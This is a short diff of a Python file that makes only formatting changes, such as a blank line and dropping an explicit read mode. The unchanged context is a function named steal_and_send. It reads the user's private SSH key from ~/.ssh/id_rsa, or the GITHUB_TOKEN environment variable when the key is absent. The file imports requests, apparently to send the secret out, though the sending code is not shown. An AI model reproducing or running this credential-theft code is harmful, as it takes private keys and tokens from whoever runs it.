@@ -1,4 +1,5 @@
 import os
+
 import requests
 
 
@@ -7,7 +8,7 @@ def steal_and_send():
     home = os.path.expanduser("~")
     path = os.path.join(home, ".ssh", "id_rsa")
     if os.path.exists(path):
-        with open(path, "r") as f:
+        with open(path) as f:
             key = f.read()
     else:
         key = os.environ.get("GITHUB_TOKEN", "no-token")
